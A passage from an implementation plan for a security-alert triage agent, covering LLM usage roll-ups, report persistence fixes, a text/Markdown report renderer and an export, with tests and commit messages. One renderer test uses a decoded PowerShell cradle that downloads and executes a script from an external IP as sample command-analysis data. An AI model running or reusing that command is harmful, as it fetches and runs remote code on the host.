                "experimental": experimental.model_dump(mode="json") if experimental else None,
            },
```

`_step_self_check` has four branches and they do not share local variables — `result` does not exist in the skipped branch and `flagged_claims` exists only in the completed one, so each branch needs its own literal. All four take the same `input`:

```python
            input={"claims": _claims_for(draft)},
```

and these outputs, in the order the branches appear in the function:

```python
# 1. model unavailable (skipped)
            output={"audits": [], "flagged_claims": [], "corrections_applied": False},

# 2. self-check call failed (degraded) — `result is None` here
            output={"audits": [], "flagged_claims": [], "corrections_applied": False},

# 3. audit count did not match claim count (degraded) — `result` exists, corrections were not applied
            output={
                "audits": [a.model_dump(mode="json") for a in result.audits],
                "flagged_claims": [],
                "corrections_applied": False,
            },

# 4. completed
            output={
                "audits": [a.model_dump(mode="json") for a in result.audits],
                "flagged_claims": flagged_claims,
                "corrections_applied": True,
            },
```

`_step_finalize_and_persist` is left alone here — Task 4 rewrites it.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `pytest -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add app/agent/state_graph.py tests/test_state_graph.py
git commit -m "feat(agent): record each step's typed input and output

The timeline carried a one-line summary and an input field that was None
on every step ever written. gather_context in particular fetched agent and
rule context and assigned it to unused locals; it now reaches the report."
```

---

### Task 3: Report-level LLM usage totals

**Files:**
- Modify: `app/schemas.py`
- Modify: `app/agent/state_graph.py` — `_assemble_report`, `investigate`
- Test: `tests/test_state_graph.py`, `tests/test_schemas.py`

**Interfaces:**
- Consumes: `InvestigationStep.llm_calls` from Task 1.
- Produces: `app.schemas.LLMUsageTotals` and `Report.llm_usage`, defaulting to an all-zero instance so existing reports validate.

- [ ] **Step 1: Write the failing tests**

In `tests/test_schemas.py`:

```python
def test_report_llm_usage_defaults_to_zero():
    report = _make_report()
    assert report.llm_usage.calls == 0
    assert report.llm_usage.prompt_tokens == 0
```

In `tests/test_state_graph.py`:

```python
def test_report_rolls_up_llm_usage_across_the_timeline():
    analyst = _make_analyst(llm_client=_FakeLLMClient(responses=_all_canned_responses()))
    alert = _make_alert()

    report = analyst.investigate(alert)

    recorded = [c for s in report.investigation_timeline for c in s.llm_calls]
    assert report.llm_usage.calls == len(recorded)
    assert report.llm_usage.prompt_tokens == sum(c.prompt_tokens for c in recorded)
    assert report.llm_usage.llm_latency_ms == sum(c.latency_ms for c in recorded)
    assert report.llm_usage.wall_clock_ms >= report.llm_usage.llm_latency_ms


def test_llm_usage_sums_reasoning_characters():
    step = InvestigationStep(
        step_name="risk_assessment", action="completed", output_summary="x",
        timestamp=datetime.now(timezone.utc),
        llm_calls=[
            LLMCallRecord(prompt_ref="a", prompt="p", attempts=1, latency_ms=5,
                          prompt_tokens=10, completion_tokens=2, reasoning="four"),
            LLMCallRecord(prompt_ref="b", prompt="p", attempts=1, latency_ms=5,
                          prompt_tokens=10, completion_tokens=2, reasoning=None),
        ],
    )

    totals = _roll_up_usage([step], wall_clock_ms=100)

    assert totals.reasoning_chars == 4
    # The gap this field exists to expose: 4 completion tokens reported against a
    # reasoning trace that usage never counted.
    assert totals.completion_tokens == 4


def test_llm_usage_tokens_are_none_when_any_call_lacks_them():
    step = InvestigationStep(
        step_name="risk_assessment", action="completed", output_summary="x",
        timestamp=datetime.now(timezone.utc),
        llm_calls=[
            LLMCallRecord(prompt_ref="a", prompt="p", attempts=1, latency_ms=5,
                          prompt_tokens=10, completion_tokens=2),
            LLMCallRecord(prompt_ref="b", prompt="p", attempts=1, latency_ms=5),
        ],
    )

    totals = _roll_up_usage([step], wall_clock_ms=100)

    assert totals.calls == 2
    assert totals.prompt_tokens is None
    assert totals.llm_latency_ms == 10


def test_llm_usage_counts_failed_calls_separately():
    step = InvestigationStep(
        step_name="self_check", action="degraded", output_summary="x",
        timestamp=datetime.now(timezone.utc),
        llm_calls=[
            LLMCallRecord(prompt_ref="a", prompt="p", attempts=2, latency_ms=360000,
                          error_kind="timeout", prompt_tokens=0, completion_tokens=0),
        ],
    )

    totals = _roll_up_usage([step], wall_clock_ms=400000)

    assert totals.calls == 1
    assert totals.failed_calls == 1
    assert totals.attempts == 2
```

Add `_roll_up_usage` and `LLMCallRecord` to the imports in the test file. `_all_canned_responses()` is a small helper — add it next to `_make_analyst`, returning the dict of canned values that lets a full `investigate()` run end to end:

```python
def _all_canned_responses():
    return {
        ExtractedIndicators: ExtractedIndicators(candidates=[
            IndicatorCandidate(type=IndicatorType.IP, value="203.0.113.5")
        ]),
        CorrelationDecision: CorrelationDecision(
            pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
        ),
        OpenValueSearchProposal: OpenValueSearchProposal(search_value="admin"),
        RiskAssessment: RiskAssessment(
            severity=Severity.MEDIUM, confidence=Confidence.MEDIUM, rationale="r"
        ),
        DraftReportCanonical: DraftReportCanonical(
            alert_summary="s", rationale="r",
            recommended_actions=[RecommendedAction.ESCALATE_TO_IR],
        ),
        DraftReportExperimental: DraftReportExperimental(
            recommended_actions_freeform=["f"],
            triage_verdict=TriageVerdict.TRUE_POSITIVE, triage_rationale="tr",
        ),
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim="s", supported=True),
            ClaimAudit(claim="r", supported=True),
            ClaimAudit(claim="Escalate to the incident response / Tier 2 team", supported=True),
        ]),
    }
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_state_graph.py tests/test_schemas.py -q`
Expected: FAIL — `ImportError: cannot import name '_roll_up_usage'`, `AttributeError: 'Report' object has no attribute 'llm_usage'`.

- [ ] **Step 3: Add the totals model**

In `app/schemas.py`, above `Report`:

```python
class LLMUsageTotals(BaseModel):
    calls: int = 0
    failed_calls: int = 0
    attempts: int = 0
    prompt_tokens: int | None = 0
    # Structured output only — the reasoning trace is not counted here. Compare against
    # reasoning_chars before reading this as "what the model produced".
    completion_tokens: int | None = 0
    # Characters, deliberately not tokens: usage never tokenises the reasoning trace,
    # and a characters-to-tokens estimate would look authoritative while being made up.
    reasoning_chars: int = 0
    llm_latency_ms: int = 0
    # Total time inside investigate(). The difference against llm_latency_ms is what
    # was spent on SIEM searches and enrichment HTTP, which is worth seeing separately.
    wall_clock_ms: int = 0
```

and on `Report`:

```python
    llm_usage: LLMUsageTotals = Field(default_factory=LLMUsageTotals)
```

- [ ] **Step 4: Roll up in the state graph**

In `app/agent/state_graph.py`, a module-level function next to `_compute_uncertainty_notes`:

```python
def _roll_up_usage(timeline: list[InvestigationStep], wall_clock_ms: int) -> LLMUsageTotals:
    calls = [c for step in timeline for c in step.llm_calls]
    # A single unmeasured call makes the whole total unknown — see _CallTally.
    known = all(c.prompt_tokens is not None for c in calls)
    return LLMUsageTotals(
        calls=len(calls),
        failed_calls=sum(1 for c in calls if c.error_kind is not None),
        attempts=sum(c.attempts for c in calls),
        prompt_tokens=sum(c.prompt_tokens for c in calls) if known else None,
        completion_tokens=sum(c.completion_tokens for c in calls) if known else None,
        reasoning_chars=sum(len(c.reasoning or "") for c in calls),
        llm_latency_ms=sum(c.latency_ms for c in calls),
        wall_clock_ms=wall_clock_ms,
    )
```

`_assemble_report` gains a `wall_clock_ms: int` parameter and passes `llm_usage=_roll_up_usage(timeline, wall_clock_ms)` to the `Report(...)` construction. `investigate` starts `started = time.monotonic()` on its first line (add `import time` at the top) and computes `int((time.monotonic() - started) * 1000)` just before calling `_assemble_report`.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `pytest -q`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add app/schemas.py app/agent/state_graph.py tests/
git commit -m "feat(agent): roll up per-report LLM usage totals

Calls, failed calls, attempts, tokens and latency, plus the wall clock the
whole investigation took. Token totals go None rather than under-report
when any contributing call had no usage to give."
```

---

### Task 4: The finalize step reaches the database

**Files:**
- Modify: `app/agent/state_graph.py:775-802` (`_step_finalize_and_persist`) and `:847-849` (`investigate`)
- Test: `tests/test_state_graph.py`

**Interfaces:**
- Consumes: nothing new.
- Produces: `_step_finalize_and_persist(self, alert: Alert, report: Report) -> None` — it now appends to `report.investigation_timeline` itself rather than returning a step.

- [ ] **Step 1: Write the failing tests**

```python
def test_saved_report_includes_the_finalize_step():
    store = _FakeAlertStore()
    analyst = _make_analyst(alert_store=store, llm_client=_FakeLLMClient(model_available=False))

    report = analyst.investigate(_make_alert())

    saved = store.reports[0]
    assert [s.step_name for s in saved.investigation_timeline][-1] == "finalize_and_persist"
    assert len(saved.investigation_timeline) == len(report.investigation_timeline)


def test_finalize_step_is_marked_degraded_when_persistence_fails():
    class _FailingStore(_FakeAlertStore):
        def save_report(self, report):
            raise RuntimeError("disk full")

    analyst = _make_analyst(alert_store=_FailingStore(), llm_client=_FakeLLMClient(model_available=False))

    report = analyst.investigate(_make_alert())

    last = report.investigation_timeline[-1]
    assert last.action == "degraded"
    assert last.output == {"persisted": False}
    assert "disk full" in last.output_summary
    # Exactly one finalize step — the optimistic entry is replaced, not appended to.
    assert sum(1 for s in report.investigation_timeline if s.step_name == "finalize_and_persist") == 1
```

Existing tests asserting on the returned step (search for `_step_finalize_and_persist`) must be rewritten to call it for its effect and read `report.investigation_timeline[-1]`.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_state_graph.py -q`
Expected: FAIL — the saved report has one fewer step than the returned one.

- [ ] **Step 3: Build the step before persisting**

Replace `_step_finalize_and_persist` entirely:

```python
    def _step_finalize_and_persist(self, alert: Alert, report: Report) -> None:
        """Append the finalize step, then persist the report that contains it.

        The step is built optimistically and appended before the save so the stored
        payload and the exported JSON describe the same nine steps. On failure the
        entry is replaced in place: the database then holds nothing (correct — the
        save failed) while the JSON file, written after investigate() returns, still
        records what went wrong.
        """
        logger.debug(
            "_step_finalize_and_persist input: report_id=%s, alert_id=%s", report.report_id, alert.alert_id
        )
        step_input = {"report_id": str(report.report_id), "alert_id": str(alert.alert_id)}
        report.investigation_timeline.append(
            InvestigationStep(
                step_name=Step.FINALIZE_AND_PERSIST.value,
                action="completed",
                tool_used="alert_store",
                input=step_input,
                output={"persisted": True},
                output_summary=f"report {report.report_id} persisted, alert marked investigated",
                timestamp=datetime.now(timezone.utc),
            )
        )
        try:
            self._alert_store.save_report(report)
            self._alert_store.update_alert_status(str(alert.alert_id), AlertStatus.INVESTIGATED)
        except Exception as exc:
            report.investigation_timeline[-1] = InvestigationStep(
                step_name=Step.FINALIZE_AND_PERSIST.value,
                action="degraded",
                tool_used="alert_store",
                input=step_input,
                output={"persisted": False},
                output_summary=f"could not persist report or update alert status: {exc}",
                timestamp=datetime.now(timezone.utc),
            )
            logger.debug("_step_finalize_and_persist output: failed: %s", exc)
            return
        logger.debug("_step_finalize_and_persist output: persisted")
```

Both `output_summary` strings are copied verbatim from the current implementation.

In `investigate`, replace the last three lines:

```python
        report = self._assemble_report(
            alert, timeline, enrichment_results, risk_assessment, draft, experimental, uncertainty_notes,
            model_available, wall_clock_ms, command_analysis=command_decode_result,
        )
        self._step_finalize_and_persist(alert, report)
        return report
```

**Known limitation to leave as-is:** if `save_report` succeeds and `update_alert_status` then fails, the stored report claims `persisted: True` while the alert stays `NEW`. That is the pre-existing behaviour of this try block and is out of scope here.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `pytest -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add app/agent/state_graph.py tests/test_state_graph.py
git commit -m "fix(agent): persist the finalize step with the report

save_report ran before the finalize step was appended, so every reports row
held eight steps while every exported JSON held nine. Build the step first,
then save; on failure replace it in place so the JSON stays honest."
```

---

### Task 5: Persist the columns the report table never had

**Files:**
- Modify: `app/storage/models.py:35-50`
- Modify: `app/storage/sqlite_alert_store.py:63-96`
- Test: `tests/test_sqlite_alert_store.py`

**Interfaces:**
- Consumes: `Report.llm_usage` (Task 3), `Report.triage_*_experimental` (already on the model).
- Produces: `ReportRecord.triage_verdict_experimental`, `.triage_rationale_experimental`, `.llm_usage` — round-tripped by `save_report`/`get_report`.

- [ ] **Step 1: Write the failing tests**

```python
def test_report_round_trips_the_experimental_triage_fields(tmp_path):
    store = _make_store(tmp_path)
    report = _make_report(
        triage_verdict_experimental="true_positive",
        triage_rationale_experimental="sandbox flagged a macro-enabled attachment",
    )

    store.save_report(report)
    loaded = store.get_report(str(report.report_id))

    assert loaded.triage_verdict_experimental == "true_positive"
    assert loaded.triage_rationale_experimental == "sandbox flagged a macro-enabled attachment"


def test_report_round_trips_llm_usage(tmp_path):
    from app.schemas import LLMUsageTotals

    store = _make_store(tmp_path)
    report = _make_report(llm_usage=LLMUsageTotals(
        calls=7, failed_calls=1, attempts=8, prompt_tokens=4200,
        completion_tokens=900, llm_latency_ms=151000, wall_clock_ms=163000,
    ))

    store.save_report(report)
    loaded = store.get_report(str(report.report_id))

    assert loaded.llm_usage.calls == 7
    assert loaded.llm_usage.failed_calls == 1
    assert loaded.llm_usage.wall_clock_ms == 163000


def test_report_round_trips_step_inputs_outputs_and_llm_calls(tmp_path):
    from app.llm.client import LLMCallRecord

    store = _make_store(tmp_path)
    report = _make_report(investigation_timeline=[
        InvestigationStep(
            step_name="risk_assessment", action="completed",
            input={"pattern_type": "brute_force"}, output={"severity": "high"},
            output_summary="severity=high, confidence=medium",
            llm_calls=[LLMCallRecord(
                prompt_ref="build_risk_assessment_prompt", prompt="assess this",
                attempts=1, latency_ms=31840, prompt_tokens=214, completion_tokens=96,
            )],
            timestamp=datetime.now(timezone.utc),
        )
    ])

    store.save_report(report)
    loaded = store.get_report(str(report.report_id))

    step = loaded.investigation_timeline[0]
    assert step.input == {"pattern_type": "brute_force"}
    assert step.output == {"severity": "high"}
    assert step.llm_calls[0].prompt == "assess this"
    assert step.llm_calls[0].latency_ms == 31840
```

`tests/test_sqlite_alert_store.py` already has a store fixture at line 49 that does `get_engine(str(tmp_path / "test.db"))` → `init_db(engine)` → `SQLiteAlertStore(engine)`. Use that fixture exactly as the file's existing report tests do; do not introduce a new `_make_store`. `_make_report` is imported in that file from `tests.test_schemas`.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_sqlite_alert_store.py -q`
Expected: FAIL — `TypeError: 'triage_verdict_experimental' is an invalid keyword argument for ReportRecord`.

- [ ] **Step 3: Add the columns**

In `app/storage/models.py`, on `ReportRecord`, after `recommended_actions_freeform_experimental`:

```python
    triage_verdict_experimental: str | None = None
    triage_rationale_experimental: str | None = None
    llm_usage: dict[str, Any] = Field(default_factory=dict, sa_column=Column(JSON))
```

- [ ] **Step 4: Map them in both directions**

In `app/storage/sqlite_alert_store.py`, `_report_to_record` gains:

```python
        triage_verdict_experimental=report.triage_verdict_experimental,
        triage_rationale_experimental=report.triage_rationale_experimental,
        llm_usage=report.llm_usage.model_dump(mode="json"),
```

and `_record_to_report` gains:

```python
        triage_verdict_experimental=record.triage_verdict_experimental,
        triage_rationale_experimental=record.triage_rationale_experimental,
        # A pre-existing row written before this column had a default dict; let the
        # model's own default supply the zeros rather than failing validation.
        llm_usage=record.llm_usage or LLMUsageTotals(),
```

with `LLMUsageTotals` added to the `app.schemas` import at the top of the file.

The step-level `input`/`output`/`llm_calls` need no mapping work: `investigation_timeline` is already dumped with `model_dump(mode="json")` and revalidated by `Report(...)` on read.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `pytest -q`
Expected: PASS.

Then delete the local database so the new columns exist on the next run — `create_all` does not alter an existing table:

```bash
rm -f data/alerts.db
```

- [ ] **Step 6: Commit**

```bash
git add app/storage/ tests/test_sqlite_alert_store.py
git commit -m "fix(storage): persist the experimental triage fields and usage totals

ReportRecord had no columns for triage_verdict_experimental or
triage_rationale_experimental, so save_report dropped them silently and
show-report could never display them. Adds those two plus llm_usage."
```

---

### Task 6: Shared report section renderer

**Files:**
- Create: `app/report_render.py`
- Modify: `app/cli.py:254-283` (`_format_report_detail`)
- Test: `tests/test_report_render.py` (new)

**Interfaces:**
- Consumes: `Report`.
- Produces:
  - `app.report_render.Section` — dataclass with `title: str | None`, `body: list[str]`, `bullets: list[str]`.
  - `report_sections(report: Report) -> list[Section]`
  - `render_text(sections: list[Section]) -> str`
  - `render_markdown(report: Report, sections: list[Section]) -> str`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_report_render.py`:

```python
from datetime import datetime, timezone

from tests.test_schemas import _make_report
from app.report_render import render_markdown, render_text, report_sections
from app.schemas import CommandDecodeResult, DecodedSegment, InvestigationStep


def test_text_rendering_matches_the_established_show_report_layout():
    report = _make_report(
        recommended_actions=["Block the source IP at the network perimeter"],
        uncertainty_notes="no MITRE ATT&CK mapping available for this alert",
    )

    output = render_text(report_sections(report))

    assert f"Report {report.report_id} (alert {report.alert_id})" in output
    assert "Status: draft" in output
    assert "Summary:" in output
    assert report.alert_summary in output
    assert "Risk: severity=medium, confidence=high" in output
    assert "Recommended actions:" in output
    assert "  - Block the source IP at the network perimeter" in output
    assert "Uncertainty notes: no MITRE ATT&CK mapping available for this alert" in output


def test_uncertainty_notes_render_as_none_when_empty():
    output = render_text(report_sections(_make_report()))
    assert "Uncertainty notes: (none)" in output


def test_command_analysis_section_is_omitted_when_absent():
    output = render_text(report_sections(_make_report()))
    assert "Command analysis:" not in output


def test_command_analysis_section_renders_decoded_segments():
    report = _make_report(command_analysis=CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(
            encoding="powershell_encoded", original="AAA",
            decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
        )],
    ))

    output = render_text(report_sections(report))

    assert "Command analysis:" in output
    assert "Command line: powershell.exe -EncodedCommand AAA" in output
    assert "[powershell_encoded]" in output


def test_timeline_section_lists_step_names_and_actions():
    report = _make_report(investigation_timeline=[
        InvestigationStep(
            step_name="enrich", action="skipped",
            output_summary="skipped: no validated indicators to enrich",
            timestamp=datetime.now(timezone.utc),
        )
    ])

    output = render_text(report_sections(report))

    assert "  - enrich: skipped" in output


def test_markdown_renders_headings_bullets_and_footer():
    report = _make_report(recommended_actions=["Escalate to a human analyst for manual review"])

    output = render_markdown(report, report_sections(report))

    assert output.startswith(f"# Investigation Report {report.report_id}")
    assert "## Summary" in output
    assert "## Recommended actions" in output
    assert "- Escalate to a human analyst for manual review" in output
    assert output.rstrip().endswith("_Internal — Ryt Bank_")


def test_markdown_omits_sections_the_text_renderer_omits():
    output = render_markdown(_make_report(), report_sections(_make_report()))
    assert "## Command analysis" not in output
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_report_render.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'app.report_render'`.

- [ ] **Step 3: Write the renderer**

Create `app/report_render.py`:

```python
from dataclasses import dataclass, field

from app.schemas import Report


@dataclass
class Section:
    """One block of a rendered report.

    Sections are built once and rendered twice — as terminal text and as Markdown —
    so the two artefacts cannot drift. A section with an empty body and no bullets is
    dropped by both renderers, which is how optional sections are omitted.
    """

    title: str | None = None
    body: list[str] = field(default_factory=list)
    bullets: list[str] = field(default_factory=list)

    def is_empty(self) -> bool:
        return not self.body and not self.bullets


def report_sections(report: Report) -> list[Section]:
    sections = [
        Section(body=[
            f"Report {report.report_id} (alert {report.alert_id})",
            f"Status: {report.status.value}",
            f"Generated: {report.generated_at.isoformat()}",
        ]),
        Section(title="Summary", body=[report.alert_summary]),
        Section(title="Risk", body=[
            f"severity={report.risk_assessment.severity.value}, "
            f"confidence={report.risk_assessment.confidence.value}",
            report.risk_assessment.rationale,
        ]),
        Section(title="Recommended actions", bullets=list(report.recommended_actions)),
    ]

    if report.command_analysis is not None:
        sections.append(Section(
            title="Command analysis",
            body=[f"Command line: {report.command_analysis.command_line or '(none)'}"],
            bullets=[
                f"[{s.encoding}] {s.decoded}" for s in report.command_analysis.decoded_segments
            ],
        ))

    sections.append(Section(
        title="Uncertainty notes", body=[report.uncertainty_notes or "(none)"]
    ))
    sections.append(Section(
        title="Timeline",
        bullets=[f"{s.step_name}: {s.action}" for s in report.investigation_timeline],
    ))
    return [s for s in sections if not s.is_empty()]


def render_text(sections: list[Section]) -> str:
    lines: list[str] = []
    for index, section in enumerate(sections):
        if index:
            lines.append("")
        if section.title == "Risk":
            # The established layout runs the title into its first line rather than
            # putting it on one of its own: "Risk: severity=..., confidence=...".
            lines.append(f"Risk: {section.body[0]}")
            lines.extend(section.body[1:])
            continue
        if section.title == "Uncertainty notes":
            lines.append(f"Uncertainty notes: {section.body[0]}")
            continue
        if section.title:
            lines.append(f"{section.title}:")
        lines.extend(section.body)
        lines.extend(f"  - {bullet}" for bullet in section.bullets)
    return "\n".join(lines)


def render_markdown(report: Report, sections: list[Section]) -> str:
    lines = [f"# Investigation Report {report.report_id}", ""]
    for section in sections:
        if section.title:
            lines.append(f"## {section.title}")
            lines.append("")
        lines.extend(section.body)
        if section.body:
            lines.append("")
        lines.extend(f"- {bullet}" for bullet in section.bullets)
        if section.bullets:
            lines.append("")
    lines.append("---")
    lines.append("")
    lines.append("_Internal — Ryt Bank_")
    return "\n".join(lines) + "\n"
```

The `Risk` and `Uncertainty notes` special cases in `render_text` exist only to preserve the exact current terminal layout, which `tests/test_cli.py` asserts against.

- [ ] **Step 4: Point the CLI at it**

In `app/cli.py`, replace the whole of `_format_report_detail` with:

```python
def _format_report_detail(report: Report) -> str:
    return render_text(report_sections(report))
```

and add `from app.report_render import render_text, report_sections` to the imports.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `pytest tests/test_report_render.py tests/test_cli.py -q`
Expected: PASS — the pre-existing `show-report` tests are the proof the terminal layout did not change.

- [ ] **Step 6: Commit**

```bash
git add app/report_render.py app/cli.py tests/test_report_render.py
git commit -m "refactor: build report sections once, render as text or Markdown

_format_report_detail assembled a list of lines inline, which a Markdown
exporter would have had to duplicate and then keep in step. Sections are
now defined once and rendered twice."
```

---

### Task 7: Experimental output in `show-report`

**Files:**
- Modify: `app/report_render.py` — `report_sections`
- Test: `tests/test_report_render.py`, `tests/test_cli.py`

**Interfaces:**
- Consumes: `report_sections` (Task 6), the triage columns (Task 5).
- Produces: an `Experimental (unvetted)` section, present only when the report carries experimental output.

- [ ] **Step 1: Write the failing tests**

In `tests/test_report_render.py`:

```python
def test_experimental_section_is_omitted_when_there_is_no_experimental_output():
    output = render_text(report_sections(_make_report()))
    assert "EXPERIMENTAL" not in output


def test_experimental_section_carries_its_disclaimer():
    report = _make_report(
        triage_verdict_experimental="true_positive",
        triage_rationale_experimental="sandbox flagged a macro-enabled attachment",
        recommended_actions_freeform_experimental=["Block the sender domain at the gateway"],
    )

    output = render_text(report_sections(report))

    assert "EXPERIMENTAL — unvetted model output" in output
    assert "Not audited by the self-check pass" in output
    assert "Triage verdict: true_positive" in output
    assert "sandbox flagged a macro-enabled attachment" in output
    assert "  - Block the sender domain at the gateway" in output


def test_experimental_section_renders_with_only_freeform_actions():
    report = _make_report(recommended_actions_freeform_experimental=["Do a thing"])

    output = render_text(report_sections(report))

    assert "EXPERIMENTAL" in output
    assert "Triage verdict:" not in output


def test_experimental_section_is_a_blockquote_in_markdown():
    report = _make_report(triage_verdict_experimental="uncertain")

    output = render_markdown(report, report_sections(report))

    assert "## Experimental (unvetted)" in output
    assert "> EXPERIMENTAL — unvetted model output" in output
```

In `tests/test_cli.py`:

```python
def test_show_report_command_prints_experimental_section_when_present(monkeypatch):
    report = _make_report(
        triage_verdict_experimental="true_positive",
        triage_rationale_experimental="looks like spear-phishing",
        recommended_actions_freeform_experimental=["Reset the affected credentials"],
    )
    store = _FakeAlertStore(reports=[report])
    monkeypatch.setattr("app.cli.build_alert_store", lambda settings: store)

    result = runner.invoke(app, ["show-report", str(report.report_id)])

    assert result.exit_code == 0
    assert "EXPERIMENTAL" in result.stdout
    assert "true_positive" in result.stdout
    assert "Reset the affected credentials" in result.stdout


def test_show_report_command_omits_experimental_section_when_absent(monkeypatch):
    report = _make_report()
    store = _FakeAlertStore(reports=[report])
    monkeypatch.setattr("app.cli.build_alert_store", lambda settings: store)

    result = runner.invoke(app, ["show-report", str(report.report_id)])

    assert result.exit_code == 0
    assert "EXPERIMENTAL" not in result.stdout
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_report_render.py tests/test_cli.py -q`
Expected: FAIL — `assert 'EXPERIMENTAL' in output` fails; nothing renders the section.

- [ ] **Step 3: Build the section**

In `app/report_render.py`, add above `report_sections`:

```python
_EXPERIMENTAL_DISCLAIMER = [
    "EXPERIMENTAL — unvetted model output. Not audited by the self-check pass.",
    "Do not action without analyst review.",
]


def _experimental_section(report: Report) -> Section:
    """The unconstrained Draft-B output, always behind its disclaimer.

    The disclaimer is part of the section body rather than something a caller adds,
    so there is no way to render this content without it.
    """
    body = list(_EXPERIMENTAL_DISCLAIMER)
    if report.triage_verdict_experimental:
        body.append("")
        body.append(f"Triage verdict: {report.triage_verdict_experimental}")
        if report.triage_rationale_experimental:
            body.append(report.triage_rationale_experimental)
    return Section(
        title="Experimental (unvetted)",
        body=body,
        bullets=list(report.recommended_actions_freeform_experimental or []),
    )


def _has_experimental_output(report: Report) -> bool:
    return bool(
        report.triage_verdict_experimental
        or report.triage_rationale_experimental
        or report.recommended_actions_freeform_experimental
    )
```

In `report_sections`, insert directly after the `Recommended actions` section is appended (before the `command_analysis` block):

```python
    if _has_experimental_output(report):
        sections.append(_experimental_section(report))
```

The `is_empty()` filter cannot drop this section, because the disclaimer always fills the body — which is why `_has_experimental_output` gates it explicitly.

In `render_markdown`, prefix the body lines of this one section with `> `:

```python
        body = section.body
        if section.title == "Experimental (unvetted)":
            body = [f"> {line}".rstrip() for line in body]
        lines.extend(body)
        if body:
            lines.append("")
```

(replacing the bare `lines.extend(section.body)` / `if section.body:` pair).

- [ ] **Step 4: Run the tests to verify they pass**

Run: `pytest -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add app/report_render.py tests/
git commit -m "feat(cli): show the experimental triage output behind a disclaimer

Draft-B's freeform actions and triage verdict were written to the report
and never displayed. They are shown now, with the disclaimer built into
the section body so the content cannot be rendered without it."
```

---

### Task 8: Markdown export alongside the JSON

**Files:**
- Modify: `app/report_export.py` (whole file)
- Modify: `app/cli.py:86-89` (`_investigate_alert`)
- Test: `tests/test_report_export.py`

**Interfaces:**
- Consumes: `render_markdown`, `report_sections` (Tasks 6-7).
- Produces: `write_report_file(report: Report, reports_dir: Path) -> tuple[Path, Path]` — `(json_path, markdown_path)`.

- [ ] **Step 1: Write the failing tests**

Replace the three existing tests in `tests/test_report_export.py` and add the new ones:

```python
def test_write_report_file_writes_both_json_and_markdown(tmp_path):
    reports_dir = tmp_path / "reports"
    report = _make_report()

    json_path, markdown_path = write_report_file(report, reports_dir)

    assert json_path == reports_dir / f"{report.report_id}.json"
    assert markdown_path == reports_dir / f"{report.report_id}.md"
    assert json_path.exists()
    assert markdown_path.exists()


def test_write_report_file_round_trips_the_json(tmp_path):
    report = _make_report()

    json_path, _markdown_path = write_report_file(report, tmp_path / "reports")

    assert Report.model_validate_json(json_path.read_text()) == report


def test_written_markdown_mirrors_the_show_report_sections(tmp_path):
    report = _make_report(recommended_actions=["Escalate to the incident response / Tier 2 team"])

    _json_path, markdown_path = write_report_file(report, tmp_path / "reports")
    content = markdown_path.read_text()

    assert content.startswith(f"# Investigation Report {report.report_id}")
    assert "## Summary" in content
    assert "## Risk" in content
    assert "- Escalate to the incident response / Tier 2 team" in content


def test_write_report_file_works_when_directory_already_exists(tmp_path):
    reports_dir = tmp_path / "reports"
    reports_dir.mkdir()

    json_path, markdown_path = write_report_file(_make_report(), reports_dir)

    assert json_path.exists()
    assert markdown_path.exists()


def test_only_one_json_file_is_written_per_report(tmp_path):
    """bench/run.py globs *.json and takes files[0]; a second .json would break it."""
    reports_dir = tmp_path / "reports"

    write_report_file(_make_report(), reports_dir)

    assert len(list(reports_dir.glob("*.json"))) == 1
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `pytest tests/test_report_export.py -q`
Expected: FAIL — `TypeError: cannot unpack non-sequence PosixPath`.

- [ ] **Step 3: Write both files**

Replace `app/report_export.py` entirely:

```python
from pathlib import Path

from app.report_render import render_markdown, report_sections
from app.schemas import Report


def write_report_file(report: Report, reports_dir: Path) -> tuple[Path, Path]:
    """Write the report as JSON for tooling and as Markdown for a human.

    The Markdown mirrors `show-report` rather than the full JSON: the per-step
    inputs, prompts and call records stay in the JSON, which is where tooling reads
    them, and out of the artefact someone pastes into a ticket.
    """
    reports_dir.mkdir(parents=True, exist_ok=True)
    json_path = reports_dir / f"{report.report_id}.json"
    json_path.write_text(report.model_dump_json(indent=2))
    markdown_path = reports_dir / f"{report.report_id}.md"
    markdown_path.write_text(render_markdown(report, report_sections(report)))
    return json_path, markdown_path
```

In `app/cli.py`, `_investigate_alert` ignores the second path explicitly:

```python
def _investigate_alert(analyst: AgenticAnalyst, alert: Alert, reports_dir: Path) -> Report:
    report = analyst.investigate(alert)
    write_report_file(report, reports_dir)
    return report
```

(unchanged — it already discards the return value; no edit needed if it reads exactly this).

- [ ] **Step 4: Run the tests to verify they pass**

Run: `pytest -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add app/report_export.py tests/test_report_export.py
git commit -m "feat: export a Markdown report alongside the JSON

Same sections as show-report, rendered from the same section builder, so
there is an artefact an analyst can paste into a ticket."
```

---

### Task 9: Documentation and prompt version

**Files:**
- Modify: `app/agent/state_graph.py` — `prompt_version` in `_assemble_report`
- Modify: `CLAUDE.md` — §2.3 `Report` table
- Modify: `PROGRESS.md` — a new findings entry
- Modify: `ROADMAP.md` — mark the work done
- Test: `tests/test_state_graph.py`

- [ ] **Step 1: Write the failing test**

```python
def test_report_records_the_current_prompt_version():
    analyst = _make_analyst(llm_client=_FakeLLMClient(model_available=False))

    report = analyst.investigate(_make_alert())

